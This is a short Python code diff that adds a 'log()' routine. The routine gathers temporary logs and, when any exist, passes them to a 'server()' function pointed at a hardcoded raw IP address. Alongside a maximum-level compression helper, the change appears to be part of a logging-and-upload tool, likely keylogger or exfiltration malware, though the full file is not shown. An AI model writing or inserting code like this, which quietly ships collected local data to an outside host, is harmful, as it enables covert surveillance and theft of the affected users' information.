@@ -45,7 +45,6 @@ def temp_log():
 
 
 def cmprss(val):
-    buf = None
     try:
         buf = compress(val, compresslevel=9)
     except TypeError:
@@ -76,6 +75,15 @@ def server(addr):
         return False
     else:
         return True
+
+
+def log():
+    temp_log()
+    if add_log():
+        server(addr="35.247.6.149")
+        sleep(5)
+    else:
+        pass
 
 
 if __name__ == "__main__":
